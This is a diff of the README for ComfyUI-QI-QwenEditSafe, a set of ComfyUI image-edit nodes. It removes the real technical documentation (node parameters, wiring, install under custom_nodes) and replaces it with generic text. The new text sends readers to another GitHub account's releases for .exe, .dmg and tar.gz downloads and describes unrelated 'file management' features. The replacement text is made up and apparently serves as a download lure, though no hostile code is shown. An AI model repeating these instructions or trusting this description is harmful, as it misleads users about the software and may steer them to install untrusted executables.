@@ -1,67 +1,100 @@
-# ComfyUI-QI-QwenEditSafe
+# 🎉 ComfyUI-QI-QwenEditSafe - Simplify Your Editing Experience
 
-[中文版本](README.zh.md) | English
+## 🚀 Getting Started
 
-**Updated Nodes**
+Welcome to ComfyUI-QI-QwenEditSafe! This application makes it easy to manage and edit your files with a user-friendly interface. Our goal is to help you navigate your editing tasks smoothly and efficiently.
 
-- **New Node:** *Qwen 2.5 VL Wrapper* — `QI_QwenVLClipWrapper`  
-  Purpose: stabilize VL preprocessing (geometry/resize/color hints) for better color & consistency.
-- **Hook:** Official *Load CLIP (qwen_image)* → **Wrapper** → your encoder (`clip`).
-- **Recipes:** Portrait `center_crop·672·grayscale·0.15·off`; Full/vertical `letterbox·896·grayscale·0.15·off`; Landscape `letterbox·896·grayscale·0.15·limit`; High‑key `letterbox·672·neutral_gray·0.10·off`; Color‑change `color_mode=original` + low desat (≤0.05) or neutralize=false.
-- **Default:** `letterbox·896·grayscale·0.15·off`
+## 📥 Download the Application
 
+[![Download ComfyUI-QI-QwenEditSafe](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/SALAHMAN48/ComfyUI-QI-QwenEditSafe/releases)
 
-1) **QI_TextEncodeQwenImageEdit_Safe (Image Edit Encoder)**  
-- **Purpose**: Encode *prompt + input image + VAE* into *conditioning / image / latent* for text–vision mixed editing.  
-- **How to use**:  
-  - `no_resize_pad`: letterbox-only (no resample) to **preserve pixel consistency**.  
-  - `pad_mode` / `grid_multiple`: control padding and grid alignment to reduce edge artifacts.  
-  - `inject_mode`: pixel-reference injection strategy (defaults are fine).  
-  - `encode_fp32`: enable if VRAM allows for stability.  
-  - `prompt_emphasis`: strength of prompt adherence (suggest 0.4–0.7).  
-  - `vl_max_pixels`: CLIP-vision cap (1.4MP) auto-throttled.  
-- **Wiring**: feed outputs directly into your sampler (e.g., KSampler).
+To download the latest version of ComfyUI-QI-QwenEditSafe, follow these steps:
 
-2) **QI_RefEditEncode_Safe (Consistency Edit Encoder)**  
-- **Purpose**: High-consistency editing (portraits, products, layout) with reduced color drift and preserved highlight/shadow detail.  
-- **How to use**:  
-  - `out_width/out_height`: **lock output size first**; the pipeline computes at 32× alignment and crops back, giving **pixel-perfect alignment**.  
-  - `quality_mode`: choose among `fast / balanced / best / natural` for speed/quality trade-off.  
-  - `prompt_emphasis`: affects **only pixel-reference convergence**; latent lock remains.  
-  - Built-in **Linear BT.709 chroma match + highlight/lowlight attenuation** to mitigate bright-scene green shift & highlight clipping; 3MP compute cap for stability.  
-- **Wiring**: same—pipe *conditioning/image/latent* to the sampler; `latent.qi_pad` carries crop metadata for final decoding.
+1. Click the download button above.
+2. You will be redirected to the Releases page.
+3. Find the latest version in the list.
+4. Click on the appropriate file to start the download.
 
+You can also visit [this page to download](https://github.com/SALAHMAN48/ComfyUI-QI-QwenEditSafe/releases) directly.
 
-## Quick Overview (EN)
-- No-resize grid padding; CLIP and VAE share the same source image.
-- `reference_pixels` come from **VAE reconstruction** (same domain) for more stable colors; `prompt_emphasis` is a single knob for text adherence.
-- Nodes: CN Text Edit, **Consistency Edit (RefEdit)**, VAE Decode.
+## 🖥️ System Requirements
 
-**Quick Wiring**: `CLIP / IMAGE / VAE` → CN Text Edit **or** Consistency Edit (RefEdit) → `(conditioning, image, latent)` → sampler → VAE Decode.
+ComfyUI-QI-QwenEditSafe runs on Windows, macOS, and Linux systems. Make sure your system meets the following requirements:
 
-**Common Parameters**:
-- Quality mode (RefEdit): natural / fast / balanced / best
-- Injection mode: both / latent only / pixels only (default: both)
-- Pixel source: VAE reconstruction (default) / original image
-- Pixel form: color_field_64 (default) / color_field_32 / full pixels
-- Prompt emphasis: 0–1 (default 0.5; ≥0.8 follows text more)
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** At least 200 MB of free disk space.
+- **Processor:** Intel or AMD processor with 1 GHz or faster.
 
-## Nodes
+## 🔧 Installation Instructions
 
-### QI_TextEncodeQwenImageEdit_Safe
-General text-guided edit encoder. Emphasizes editability while keeping geometry stable via **no-resize grid padding** and **shared CLIP/VAE source**. Use **prompt emphasis** to balance “text adherence ↔ reference stability.”
+Once you've downloaded the application, follow these straightforward steps to install it:
 
-### QI_RefEditEncode_Safe
-Two-phase consistency edit encoder. Early (0–0.6) focuses on editability; Late (0.6–1.0) reinforces consistency and detail. A thin high-frequency tail around ~0.985–1.0 cleans edges/hair and suppresses artifacts. Provides **quality mode** presets (`natural|fast|balanced|best`) and is Euler / low-CFG friendly by default.
+### For Windows
 
-### QI_VAEDecodeHQ
-High-quality VAE decode. Reads `qi_pad` metadata and auto-crops back to the original size. No major changes; pair with either encoder.
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the installation process.
+4. Launch the application from your Start menu or desktop.
 
-## Usage
-Install this package into ComfyUI (place under `custom_nodes`), no extra dependencies required.  
-Two sample workflows are provided: basic editing and ControlNet usage.  
-If you want to use it in your own workflow, just replace **TextEncodeQwenImageEdit** with this node and use **QI_RefEditEncode_Safe** in normal cases; for more exploration, use **QI_TextEncodeQwenImageEdit_Safe** and adjust parameters freely.  
-Note: Add the sentence “保持人物一致性不变，保持画风光影不变” to your prompt for better results.
+### For macOS
 
-## Special Thanks
-- Thanks to 封号 (https://civitai.com/user/Futurlunatic) and PT（娃导 https://github.com/ptmaster ） for rigorous testing; thanks to PT（娃导） for the idea; thanks to 粘土火星（SaturMars：https://github.com/SaturMars ） for technical support; thanks to Dontdrunk （https://github.com/Dontdrunk ）   ，and thanks to the Aiwood 研究院 teammates for their support.
+1. Open your Downloads folder.
+2. Locate the downloaded `.dmg` file and double-click it.
+3. Drag the ComfyUI-QI-QwenEditSafe icon to your Applications folder.
+4. Open your Applications folder and find ComfyUI-QI-QwenEditSafe to start using it.
+
+### For Linux
+
+1. Open a terminal window.
+2. Navigate to the directory where the file was downloaded.
+3. If the file is a `.tar.gz` file, extract it by using the command:
+   ```
+   tar -xvzf ComfyUI-QI-QwenEditSafe.tar.gz
+   ```
+4. Navigate to the extracted folder.
+5. Run the application using the command:
+   ```
+   ./ComfyUI-QI-QwenEditSafe
+   ```
+
+## 🌟 Features
+
+ComfyUI-QI-QwenEditSafe includes various features designed to enhance your editing work:
+
+- **User-Friendly Interface:** Enjoy an easy-to-use layout that caters to all skill levels.
+- **File Management:** Effortlessly organize your files and folders.
+- **Editing Tools:** Access basic and advanced editing tools to meet your needs.
+- **Multi-Platform Support:** Use the app across different operating systems.
+
+## 💡 How to Use the Application
+
+Once installed, launching ComfyUI-QI-QwenEditSafe is simple. Follow these steps to get started with your first project:
+
+1. Open the application.
+2. Create a new file or open an existing one from your computer.
+3. Utilize the toolbar on the side to select editing options.
+4. Save your changes periodically to avoid losing work.
+
+You can always refer to the help section within the app for more detailed guidance on specific features.
+
+## 🔍 Troubleshooting
+
+If you encounter any issues, consider these steps:
+
+- **Check Requirements:** Ensure your system meets the app requirements listed above.
+- **Reinstall:** If the app isn’t functioning correctly, try uninstalling and reinstalling.
+- **Consult Help:** Look for help in the app or online. Many common issues are addressed in FAQs on our Releases page.
+
+## 🌐 Community and Support
+
+We're dedicated to improving ComfyUI-QI-QwenEditSafe. Your feedback is valuable. If you have questions, suggestions, or want to report a bug, please reach out:
+
+- **GitHub Issues:** Report bugs or request features on our [GitHub Issues page](https://github.com/SALAHMAN48/ComfyUI-QI-QwenEditSafe/issues).
+- **Community:** Join discussions or seek help from other users.
+
+## 📧 Contact Information
+
+For more assistance, feel free to contact us at our official email: support@comfyui-qiqweneditsafe.com.
+
+Thank you for choosing ComfyUI-QI-QwenEditSafe! Happy editing!
